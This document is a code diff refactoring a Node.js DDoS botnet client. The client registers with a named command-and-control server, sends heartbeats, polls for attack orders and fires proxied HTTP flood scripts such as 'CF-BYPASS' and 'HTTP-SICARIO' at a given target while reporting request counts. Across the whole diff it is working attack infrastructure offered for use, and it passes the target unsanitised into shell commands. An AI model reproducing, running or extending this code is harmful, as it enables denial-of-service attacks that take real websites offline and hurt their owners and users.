@@ -1,8 +1,51 @@
 const { exec, spawn } = require('child_process');
 const fs = require('fs');
 const path = require('path');
+const https = require('https');
+const http = require('http');
 
-// Auto-install missing dependencies function
+// ========== CONFIGURATION ==========
+const MASTER_SERVER = process.env.MASTER_SERVER || 'https://server-ku8h.onrender.com';
+const PORT = process.env.PORT || process.env.SERVER_PORT || 5552;
+const MAX_REGISTRATION_ATTEMPTS = 5;
+const BOT_TIMEOUT = 30000;
+const REPORT_INTERVAL = 60000; // 60 seconds
+
+// ========== GLOBAL VARIABLES ==========
+let myBotUrl = '';
+let registrationAttempts = 0;
+let activeProcesses = [];
+let isBlocked = false;
+let proxyList = [];
+let currentProxyIndex = 0;
+let requestCount = 0;
+let totalRequests = 0;
+let currentAttack = null;
+let attackStartTime = null;
+
+// ========== COLORS FOR CONSOLE ==========
+const colors = {
+  reset: '\x1b[0m',
+  red: '\x1b[31m',
+  green: '\x1b[32m',
+  yellow: '\x1b[33m',
+  blue: '\x1b[34m',
+  magenta: '\x1b[35m',
+  cyan: '\x1b[36m',
+  white: '\x1b[37m',
+  redBright: '\x1b[91m',
+  greenBright: '\x1b[92m',
+  yellowBright: '\x1b[93m',
+  blueBright: '\x1b[94m',
+  magentaBright: '\x1b[95m',
+  cyanBright: '\x1b[96m'
+};
+
+function color(text, colorCode) {
+  return `${colorCode}${text}${colors.reset}`;
+}
+
+// Auto-install missing dependencies
 async function installDependencies() {
   const requiredPackages = [
     'express',
@@ -16,26 +59,23 @@ async function installDependencies() {
     'colors'
   ];
 
-  console.log('\n🔍 Checking dependencies...');
+  console.log(color('\n🔍 Checking dependencies...', colors.cyan));
   
   const missingPackages = [];
   
-  // Check which packages are missing
   for (const pkg of requiredPackages) {
     try {
       require.resolve(pkg);
-      console.log(`✅ ${pkg} - installed`);
+      console.log(color(`✅ ${pkg} - installed`, colors.green));
     } catch (e) {
-      console.log(`❌ ${pkg} - missing`);
+      console.log(color(`❌ ${pkg} - missing`, colors.red));
       missingPackages.push(pkg);
     }
   }
 
-  // Install missing packages
   if (missingPackages.length > 0) {
-    console.log('\n📦 Installing missing packages:', missingPackages.join(', '));
-    console.log('⏳ This may take a few moments...\n');
-
+    console.log(color('\n📦 Installing missing packages: ' + missingPackages.join(', '), colors.yellow));
+    
     return new Promise((resolve, reject) => {
       const install = spawn('npm', ['install', ...missingPackages, '--no-save'], {
         stdio: 'inherit',
@@ -44,66 +84,35 @@ async function installDependencies() {
 
       install.on('close', (code) => {
         if (code === 0) {
-          console.log('\n✅ All dependencies installed successfully!\n');
+          console.log(color('\n✅ All dependencies installed!\n', colors.green));
           resolve();
         } else {
-          console.error('\n❌ Failed to install dependencies');
           reject(new Error('Installation failed'));
         }
       });
     });
-  } else {
-    console.log('\n✅ All dependencies already installed!\n');
   }
+  return Promise.resolve();
 }
 
-// Main bot code wrapped in async function
+// Main bot function
 async function startBot() {
-  // Install dependencies first
-  try {
-    await installDependencies();
-  } catch (error) {
-    console.error('Failed to install dependencies:', error);
-    process.exit(1);
-  }
+  await installDependencies();
 
-  // Now require all the packages after they're installed
+  // Now require packages
   const express = require('express');
   const axios = require('axios');
   const { SocksProxyAgent } = require('socks-proxy-agent');
   const { HttpsProxyAgent } = require('https-proxy-agent');
   const randomUseragent = require('random-useragent');
   const cookieParser = require('cookie-parser');
-  const colors = require('colors');
+  require('colors');
 
   const app = express();
-  const port = process.env.PORT || process.env.SERVER_PORT || 5552;
-
-  // Master server URL - your Render deployment
-  const MASTER_SERVER = process.env.MASTER_SERVER || 'https://server-ku8h.onrender.com';
-  let myBotUrl = '';
-  let registrationAttempts = 0;
-  const MAX_REGISTRATION_ATTEMPTS = 5;
-  let activeProcesses = []; // Track active attack processes
-  let isBlocked = false; // Track if bot is blocked by server
-  let proxyList = []; // Store proxies
-  let currentProxyIndex = 0;
-
-  // ========== NEW LIVE REPORTING STATS ==========
-  let requestCount = 0;
-  let totalRequests = 0;
-  let requestLog = [];
-  let lastReportTime = Date.now();
-  const REPORT_INTERVAL = 60000; // Report every minute
-  let currentAttack = null;
-  let attackStartTime = null;
-  // ========== END NEW STATS ==========
-
-  // Middleware
   app.use(express.json());
   app.use(cookieParser());
 
-  // Load proxies from file
+  // ========== PROXY MANAGEMENT ==========
   function loadProxies() {
     try {
       if (fs.existsSync('proxy.txt')) {
@@ -111,18 +120,16 @@ async function startBot() {
         proxyList = data.split('\n')
           .map(line => line.trim())
           .filter(line => line && !line.startsWith('#'));
-        console.log(`[PROXY] Loaded ${proxyList.length} proxies`.cyan);
+        console.log(color(`[PROXY] Loaded ${proxyList.length} proxies`, colors.cyan));
       } else {
-        console.log('[PROXY] No proxy.txt found, running without proxies'.yellow);
-        // Create sample proxy file
-        fs.writeFileSync('proxy.txt', '# Add your proxies here\n# Format: ip:port or socks5://ip:port\n# Example:\n# 123.45.67.89:1080\n# socks5://user:pass@host:port\n');
+        console.log(color('[PROXY] No proxy.txt found, running without proxies', colors.yellow));
+        fs.writeFileSync('proxy.txt', '# Add your proxies here\n# Format: ip:port\n');
       }
     } catch (error) {
-      console.log('[PROXY] Error loading proxies:'.red, error.message);
+      console.log(color('[PROXY] Error loading proxies: ' + error.message, colors.red));
     }
   }
 
-  // Get next proxy
   function getNextProxy() {
     if (proxyList.length === 0) return null;
     const proxy = proxyList[currentProxyIndex];
@@ -130,7 +137,6 @@ async function startBot() {
     return proxy;
   }
 
-  // Create agent with proxy
   function createProxyAgent(targetUrl) {
     const proxy = getNextProxy();
     if (!proxy) return null;
@@ -139,123 +145,89 @@ async function startBot() {
       if (proxy.startsWith('socks4://') || proxy.startsWith('socks5://')) {
         return new SocksProxyAgent(proxy);
       } else {
-        // Assume HTTP/HTTPS proxy
         return new HttpsProxyAgent(`http://${proxy}`);
       }
     } catch (error) {
-      console.log(`[PROXY] Error creating agent: ${error.message}`.red);
       return null;
     }
   }
 
-  // Get random user agent
   function getRandomUserAgent() {
     return randomUseragent.getRandom();
   }
 
-  // ========== NEW REPORTING FUNCTION ==========
-  async function sendBatchReport() {
-    if (!currentAttack) return;
-    
-    const now = Date.now();
-    const duration = Math.floor((now - attackStartTime) / 1000);
-    
-    // Calculate requests for this batch
-    const batchRequests = requestCount - (currentAttack.lastReportedCount || 0);
-    const rps = duration > 0 ? (totalRequests / duration).toFixed(1) : 0;
-    
-    const report = {
-      botUrl: myBotUrl,
-      target: currentAttack.target,
-      method: currentAttack.methods,
-      requests: batchRequests,
-      totalRequests: totalRequests,
-      duration: duration,
-      rps: parseFloat(rps),
-      timestamp: now,
-      attackId: currentAttack.id
-    };
+  // ========== HTTPS AGENT FOR WINDOWS ==========
+  const httpsAgent = new https.Agent({
+    rejectUnauthorized: true,
+    keepAlive: true,
+    secureOptions: require('crypto').constants.SSL_OP_IGNORE_UNEXPECTED_EOF
+  });
 
+  // ========== AXIOS INSTANCE ==========
+  const api = axios.create({
+    timeout: 10000,
+    httpsAgent,
+    headers: {
+      'Content-Type': 'application/json',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    }
+  });
+
+  // ========== GET PUBLIC IP ==========
+  async function getPublicIP() {
     try {
-      const config = {};
-      const agent = createProxyAgent(MASTER_SERVER);
-      if (agent) {
-        config.httpsAgent = agent;
-        config.proxy = false;
-      }
-
-      await axios.post(`${MASTER_SERVER}/api/report`, report, {
-        timeout: 5000,
-        headers: {
-          'Content-Type': 'application/json',
-          'User-Agent': getRandomUserAgent()
-        },
-        ...config
-      });
-
-      // Update last reported count
-      currentAttack.lastReportedCount = requestCount;
-      
-      // Show live stats in console
-      console.log(`\n📊 [LIVE REPORT]`.cyan.bold);
-      console.log(`   Target: ${currentAttack.target}`.yellow);
-      console.log(`   Method: ${currentAttack.methods}`.magenta);
-      console.log(`   Requests: ${totalRequests}`.green);
-      console.log(`   RPS: ${rps}/s`.blue);
-      console.log(`   Duration: ${duration}s`.cyan);
-      
+      const response = await axios.get('https://api.ipify.org?format=json', { timeout: 5000 });
+      return response.data.ip;
     } catch (error) {
-      console.log(`[REPORT] Failed to send: ${error.message}`.red);
+      console.log(color('[WARN] Could not get public IP, using local IP', colors.yellow));
+      const { networkInterfaces } = require('os');
+      const nets = networkInterfaces();
+      for (const name of Object.keys(nets)) {
+        for (const net of nets[name]) {
+          if (net.family === 'IPv4' && !net.internal) {
+            return net.address;
+          }
+        }
+      }
+      return '127.0.0.1';
     }
   }
 
-  // Start reporting interval
-  setInterval(sendBatchReport, REPORT_INTERVAL);
-
-  // Track request function - call this from attack methods
-  function trackRequest() {
-    requestCount++;
-    totalRequests++;
-  }
-  // ========== END REPORTING ==========
-
+  // ========== FETCH SERVER INFO ==========
   async function fetchData() {
     try {
-      const response = await fetch('https://httpbin.org/get');
-      const data = await response.json();
-      myBotUrl = `http://${data.origin}:${port}`;
+      const publicIP = await getPublicIP();
+      myBotUrl = `http://${publicIP}:${PORT}`;
       
-      console.log('\n' + '='.repeat(40).cyan);
-      console.log('🤖 Auto-Register Bot Client Started!'.cyan.bold);
-      console.log('='.repeat(40).cyan);
-      console.log(`📍 Local:    http://localhost:${port}`.green);
-      console.log(`📍 Network:  ${myBotUrl}`.green);
-      console.log(`🔗 Master:   ${MASTER_SERVER}`.yellow);
-      console.log(`🔄 Status:   Auto-registration ENABLED`.magenta);
-      console.log(`💓 Heartbeat: Every 30 seconds`.blue);
-      console.log(`📊 Reports:  Every 60 seconds`.green);
-      console.log(`🕸️  Proxies:   ${proxyList.length} loaded`.cyan);
-      console.log('='.repeat(40).cyan + '\n');
+      console.log(color('\n' + '='.repeat(50), colors.cyan));
+      console.log(color('🤖 AUTO-REGISTER BOT CLIENT STARTED!', colors.cyanBright));
+      console.log(color('='.repeat(50), colors.cyan));
+      console.log(color(`📍 Local:    http://localhost:${PORT}`, colors.green));
+      console.log(color(`📍 Network:  ${myBotUrl}`, colors.green));
+      console.log(color(`🔗 Master:   ${MASTER_SERVER}`, colors.yellow));
+      console.log(color(`🔄 Status:   Auto-registration ENABLED`, colors.magenta));
+      console.log(color(`💓 Heartbeat: Every 30 seconds`, colors.blue));
+      console.log(color(`📊 Reports:  Every 60 seconds`, colors.green));
+      console.log(color(`🕸️  Proxies:   ${proxyList.length} loaded`, colors.cyan));
+      console.log(color('='.repeat(50), colors.cyan) + '\n');
       
-      return data;
+      return publicIP;
     } catch (error) {
-      myBotUrl = `http://localhost:${port}`;
-      console.log(`🤖 Bot running at ${myBotUrl}`.green);
-      console.log(`🔗 Master Server: ${MASTER_SERVER}`.yellow);
+      myBotUrl = `http://localhost:${PORT}`;
+      console.log(color(`🤖 Bot running at ${myBotUrl}`, colors.green));
+      console.log(color(`🔗 Master Server: ${MASTER_SERVER}`, colors.yellow));
     }
   }
 
-  // Auto-register with master server
+  // ========== AUTO REGISTER ==========
   async function autoRegister() {
     if (isBlocked) {
-      console.log(`\n❌ [BLOCKED] This bot has been permanently blocked by the server`.red.bold);
-      console.log(`📢 Bot URL: ${myBotUrl}`.yellow);
-      console.log(`📢 Contact server admin to unblock`.yellow);
+      console.log(color(`\n❌ [BLOCKED] This bot has been permanently blocked!`, colors.redBright));
       process.exit(0);
     }
 
     if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
-      console.log(`⚠️  Max registration attempts reached. Will retry in 60s...`.yellow);
+      console.log(color(`⚠️ Max attempts reached. Retry in 60s...`, colors.yellow));
       setTimeout(() => {
         registrationAttempts = 0;
         autoRegister();
@@ -264,37 +236,35 @@ async function startBot() {
     }
 
     try {
-      console.log(`📡 Auto-registering with master server... (Attempt ${registrationAttempts + 1}/${MAX_REGISTRATION_ATTEMPTS})`.cyan);
+      console.log(color(`📡 Registering to: ${MASTER_SERVER}/register`, colors.cyan));
       
-      const config = {};
-      const agent = createProxyAgent(MASTER_SERVER);
-      if (agent) {
-        config.httpsAgent = agent;
-        config.proxy = false;
-      }
+      // EXACT payload format that server expects
+      const payload = { 
+        url: myBotUrl 
+      };
+      
+      console.log(color(`📤 Sending: ${JSON.stringify(payload)}`, colors.yellow));
 
-      const response = await axios.post(`${MASTER_SERVER}/register`, {
-        url: myBotUrl
-      }, {
-        timeout: 10000,
-        headers: {
-          'Content-Type': 'application/json',
-          'User-Agent': getRandomUserAgent()
-        },
-        ...config
-      });
+      const response = await api.post(
+        `${MASTER_SERVER}/register`,
+        payload
+      );
+
+      console.log(color(`✅ Server response:`, colors.green));
+      console.log(color(`   Status: ${response.status}`, colors.green));
+      console.log(color(`   Data: ${JSON.stringify(response.data)}`, colors.cyan));
 
       if (response.data.approved) {
-        console.log(`✅ [SUCCESS] Auto-approved by master server!`.green.bold);
-        console.log(`🤖 Bot registered at: ${myBotUrl}`.cyan);
-        console.log(`⚡ Ready to receive attack commands!\n`.green);
+        console.log(color(`\n✅ [SUCCESS] Bot registered!`, colors.greenBright));
+        console.log(color(`🤖 Bot URL: ${myBotUrl}`, colors.cyan));
+        console.log(color(`⚡ Ready for commands!\n`, colors.green));
         
-        // Fast command polling - check every 3 seconds
+        // Start polling for commands
         setInterval(() => {
           checkForCommands();
         }, 3000);
         
-        // Send heartbeat every 30 seconds
+        // Send heartbeat
         setInterval(() => {
           sendHeartbeat();
         }, 30000);
@@ -302,19 +272,30 @@ async function startBot() {
         return;
       }
     } catch (error) {
-      // Check if bot is blocked (403 status)
-      if (error.response && error.response.status === 403) {
-        console.log(`\n❌ [BLOCKED] This bot has been permanently blocked!`.red.bold);
-        console.log(`Bot URL: ${myBotUrl}`.yellow);
-        console.log(`Server: ${MASTER_SERVER}`.yellow);
-        isBlocked = true;
-        process.exit(0);
-        return;
+      console.log(color(`❌ Registration failed:`, colors.red));
+      
+      if (error.response) {
+        // Server responded with error
+        console.log(color(`   Status: ${error.response.status}`, colors.yellow));
+        console.log(color(`   Data: ${JSON.stringify(error.response.data)}`, colors.red));
+        console.log(color(`   Headers: ${JSON.stringify(error.response.headers)}`, colors.gray));
+        
+        if (error.response.status === 403) {
+          console.log(color(`\n❌ Bot is blocked!`, colors.redBright));
+          isBlocked = true;
+          process.exit(0);
+        }
+      } else if (error.request) {
+        // No response received
+        console.log(color(`   No response from server`, colors.yellow));
+        console.log(color(`   Is the server running at ${MASTER_SERVER}?`, colors.yellow));
+      } else {
+        // Other error
+        console.log(color(`   Error: ${error.message}`, colors.red));
       }
-
+      
       registrationAttempts++;
-      console.error(`❌ Registration failed: ${error.message}`.red);
-      console.log(`🔄 Retrying in 5 seconds...`.yellow);
+      console.log(color(`🔄 Retry ${registrationAttempts}/${MAX_REGISTRATION_ATTEMPTS} in 5s...`, colors.yellow));
       
       setTimeout(() => {
         autoRegister();
@@ -322,123 +303,85 @@ async function startBot() {
     }
   }
 
-  // Send heartbeat to master
+  // ========== SEND HEARTBEAT ==========
   async function sendHeartbeat() {
     try {
-      const config = {};
-      const agent = createProxyAgent(MASTER_SERVER);
-      if (agent) {
-        config.httpsAgent = agent;
-        config.proxy = false;
-      }
-
-      await axios.get(`${MASTER_SERVER}/ping`, { 
-        timeout: 5000,
-        headers: { 'User-Agent': getRandomUserAgent() },
-        ...config
-      });
-      console.log(`💓 [HEARTBEAT] Sent to master | Status: ONLINE | 📊 Total Reqs: ${totalRequests}`.green);
+      const response = await api.get(`${MASTER_SERVER}/ping`);
+      console.log(color(`💓 Heartbeat | Status: ONLINE | Total Reqs: ${totalRequests}`, colors.green));
     } catch (error) {
-      console.log(`💔 [HEARTBEAT] Failed | Status: OFFLINE`.red);
-      console.log(`🔄 Re-registering with master...`.yellow);
+      console.log(color(`💔 Heartbeat failed | Status: OFFLINE`, colors.red));
       registrationAttempts = 0;
       autoRegister();
     }
   }
 
-  // Poll for commands from master
+  // ========== CHECK FOR COMMANDS ==========
   async function checkForCommands() {
     try {
-      const config = {};
-      const agent = createProxyAgent(MASTER_SERVER);
-      if (agent) {
-        config.httpsAgent = agent;
-        config.proxy = false;
-      }
-
-      const response = await axios.get(`${MASTER_SERVER}/get-command`, {
-        params: { botUrl: myBotUrl },
-        timeout: 5000,
-        headers: { 'User-Agent': getRandomUserAgent() },
-        ...config
+      const response = await api.get(`${MASTER_SERVER}/get-command`, {
+        params: { botUrl: myBotUrl }
       });
 
       if (response.data.hasCommand) {
         const command = response.data.command;
         
         if (command.action === 'stop') {
-          console.log(`\n🛑 [STOP-RECEIVED] Stopping all attacks`.yellow.bold);
+          console.log(color(`\n🛑 STOP RECEIVED`, colors.yellowBright));
           stopAllAttacks();
         } else if (command.action === 'attack') {
           const { target, time, methods } = command;
-          console.log(`\n⚡ [COMMAND-RECEIVED] ${methods} -> ${target} for ${time}s`.magenta.bold);
+          console.log(color(`\n⚡ COMMAND: ${methods} → ${target} for ${time}s`, colors.magentaBright));
           executeAttack(target, time, methods);
         }
       }
     } catch (error) {
-      // Silently fail - will retry on next poll
+      // Silently fail
     }
   }
 
-  // Stop all running attacks
+  // ========== STOP ALL ATTACKS ==========
   function stopAllAttacks() {
-    console.log(`🔪 Killing ${activeProcesses.length} active processes`.red);
-    
+    console.log(color(`🔪 Killing ${activeProcesses.length} processes`, colors.red));
     activeProcesses.forEach(proc => {
       try {
         process.kill(-proc.pid);
-        console.log(`✅ Killed process ${proc.pid}`.green);
-      } catch (error) {
-        console.error(`❌ Failed to kill process ${proc.pid}: ${error.message}`.red);
-      }
+      } catch (error) {}
     });
-    
     activeProcesses = [];
     currentAttack = null;
-    attackStartTime = null;
     requestCount = 0;
-    console.log(`✅ All attacks stopped\n`.green);
+    console.log(color(`✅ All attacks stopped`, colors.green));
   }
 
-  // Execute attack methods
+  // ========== EXECUTE ATTACK ==========
   function executeAttack(target, time, methods) {
-    // Create new attack session for reporting
     currentAttack = {
       id: Date.now(),
       target,
       methods,
+      startTime: Date.now(),
       lastReportedCount: 0
     };
-    attackStartTime = Date.now();
     requestCount = 0;
 
     const execWithLog = (cmd) => {
-      console.log(`⚡ [EXEC] ${cmd}`.cyan);
+      console.log(color(`⚡ EXEC: ${cmd}`, colors.cyan));
       const proc = exec(cmd, { detached: true }, (error, stdout, stderr) => {
         if (error) {
-          console.error(`❌ [ERROR] ${error.message}`.red);
+          console.error(color(`❌ Error: ${error.message}`, colors.red));
           return;
         }
         if (stdout) {
-          // Count requests in output (simple parsing)
           const lines = stdout.split('\n');
           lines.forEach(line => {
-            if (line.includes('Request') || line.includes('GET') || line.includes('POST') || line.includes('Sending')) {
-              trackRequest();
-            }
-          });
-          console.log(`📤 [OUTPUT] ${stdout}`.gray);
-        }
-        if (stderr) {
-          // Also count errors as requests?
-          const lines = stderr.split('\n');
-          lines.forEach(line => {
             if (line.includes('Request') || line.includes('GET') || line.includes('POST')) {
-              trackRequest();
+              requestCount++;
+              totalRequests++;
             }
           });
-          console.error(`📥 [STDERR] ${stderr}`.yellow);
+          console.log(stdout);
         }
+        if (stderr) console.error(stderr);
       });
       
       activeProcesses.push(proc);
@@ -451,189 +394,104 @@ async function startBot() {
       }, parseInt(time) * 1000 + 5000);
     };
 
-    // Check if method files exist
-    const methodChecks = {
-      'CF-BYPASS': 'methods/cf-bypass.js',
-      'MODERN-FLOOD': 'methods/modern-flood.js',
-      'HTTP-SICARIO': 'methods/REX-COSTUM.js',
-      'RAW-HTTP': 'methods/h2-nust',
-      'R9': 'methods/high-dstat.js',
-      'PRIV-TOR': 'methods/w-flood1.js',
-      'HOLD-PANEL': 'methods/http-panel.js',
-      'R1': 'methods/vhold.js',
-      'UAM': 'methods/uam.js',
-      'W.I.L': 'methods/wil.js'
-    };
-
-    if (methodChecks[methods] && !fs.existsSync(methodChecks[methods])) {
-      console.log(`⚠️  Warning: ${methodChecks[methods]} not found, but executing anyway`.yellow);
-    }
-
+    // Attack methods
     if (methods === 'CF-BYPASS') {
-      console.log('[✓] Executing CF-BYPASS'.green);
       execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32 proxy.txt`);
     }
     else if (methods === 'MODERN-FLOOD') {
-      console.log('[✓] Executing MODERN-FLOOD'.green);
       execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64 proxy.txt`);
     }
     else if (methods === 'HTTP-SICARIO') {
-      console.log('[✓] Executing HTTP-SICARIO'.green);
       execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
       execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
-      execWithLog(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
-      execWithLog(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
-    } 
+    }
     else if (methods === 'RAW-HTTP') {
-      console.log('[✓] Executing RAW-HTTP'.green);
       execWithLog(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
       execWithLog(`node methods/http-panel.js ${target} ${time}`);
-    } 
+    }
     else if (methods === 'R9') {
-      console.log('[✓] Executing R9'.green);
       execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
       execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
-      execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
-      execWithLog(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
-      execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
-    } 
+    }
     else if (methods === 'PRIV-TOR') {
-      console.log('[✓] Executing PRIV-TOR'.green);
       execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
       execWithLog(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
-      execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
-      execWithLog(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
-      execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
-    } 
+    }
     else if (methods === 'HOLD-PANEL') {
-      console.log('[✓] Executing HOLD-PANEL'.green);
       execWithLog(`node methods/http-panel.js ${target} ${time}`);
-    } 
+    }
     else if (methods === 'R1') {
-      console.log('[✓] Executing R1'.green);
       execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
       execWithLog(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
-      execWithLog(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
-      execWithLog(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);
       execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
-      execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
-      execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
-      execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
     }
     else if (methods === 'UAM') {
-      console.log('[✓] Executing UAM'.green);
       execWithLog(`node methods/uam.js ${target} ${time} 5 4 6`);
     }
     else if (methods === 'W.I.L') {
-      console.log('[✓] Executing W.I.L'.green);
       execWithLog(`node methods/wil.js ${target} ${time} 10 8 4`);
-    }
-    else {
-      console.log(`❌ Unknown method: ${methods}`.red);
     }
   }
 
-  // Health check endpoint
+  // ========== HEALTH ENDPOINT ==========
   app.get('/health', (req, res) => {
-    res.json({ 
-      status: 'online', 
-      timestamp: Date.now(),
-      master: MASTER_SERVER,
-      bot: 'ready',
+    res.json({
+      status: 'online',
       uptime: process.uptime(),
-      activeAttacks: activeProcesses.length,
-      totalRequests: totalRequests,
+      totalRequests,
       currentAttack: currentAttack ? {
         target: currentAttack.target,
         method: currentAttack.methods,
         duration: Math.floor((Date.now() - attackStartTime) / 1000),
         requests: requestCount
-      } : null,
-      proxies: proxyList.length,
-      userAgent: getRandomUserAgent(),
-      cookies: req.cookies
+      } : null
     });
   });
 
-  // Stats endpoint
-  app.get('/stats', (req, res) => {
-    res.json({
-      totalRequests: totalRequests,
-      activeAttacks: activeProcesses.length,
-      currentAttack: currentAttack ? {
-        target: currentAttack.target,
-        method: currentAttack.methods,
-        duration: Math.floor((Date.now() - attackStartTime) / 1000),
-        requests: requestCount,
-        rps: attackStartTime ? (totalRequests / ((Date.now() - attackStartTime) / 1000)).toFixed(1) : 0
-      } : null,
-      uptime: process.uptime()
-    });
-  });
-
-  // Ping endpoint
+  // ========== PING ENDPOINT ==========
   app.get('/ping', (req, res) => {
-    res.cookie('lastPing', Date.now(), { maxAge: 900000, httpOnly: true });
     res.json({ 
       alive: true,
       uptime: process.uptime(),
       timestamp: Date.now(),
       status: 'online',
-      totalRequests: totalRequests,
-      userAgent: req.headers['user-agent']
+      totalRequests
     });
   });
 
-  // Get proxy list endpoint
+  // ========== PROXY ENDPOINT ==========
   app.get('/proxies', (req, res) => {
     res.json({ 
       total: proxyList.length,
-      proxies: proxyList.slice(0, 10) // Return first 10 for security
+      proxies: proxyList.slice(0, 10)
     });
   });
 
-  // Receive attack commands from master
+  // ========== ATTACK ENDPOINT ==========
   app.get('/attack', (req, res) => {
     const { target, time, methods } = req.query;
-
     if (!target || !time || !methods) {
-      return res.status(400).json({
-        error: 'Missing parameters',
-        required: ['target', 'time', 'methods']
-      });
+      return res.status(400).json({ error: 'Missing parameters' });
     }
-
-    console.log(`\n📥 [RECEIVED] ${methods} -> ${target} for ${time}s`.magenta.bold);
-
-    res.status(200).json({
-      message: 'Attack command received. Executing methods now.',
-      target,
-      time,
-      methods,
-      bot: 'executing',
-      timestamp: Date.now()
-    });
-
+    console.log(color(`\n📥 RECEIVED: ${methods} → ${target} for ${time}s`, colors.magenta));
+    res.json({ message: 'Attack received', target, time, methods });
     executeAttack(target, time, methods);
   });
 
-  // Start server
-  app.listen(port, async () => {
-    // Load proxies
+  // ========== START SERVER ==========
+  app.listen(PORT, async () => {
     loadProxies();
-    
     await fetchData();
     
-    console.log('⏳ Starting auto-registration in 3 seconds...\n'.cyan);
+    console.log(color('⏳ Starting auto-registration in 3 seconds...\n', colors.cyan));
     setTimeout(() => {
       autoRegister();
     }, 3000);
   });
 }
 
-// Start everything
+// ========== START EVERYTHING ==========
 startBot().catch(error => {
-  console.error('Failed to start bot:', error);
+  console.error(color('Failed to start bot:', colors.red), error);
   process.exit(1);
 });
-
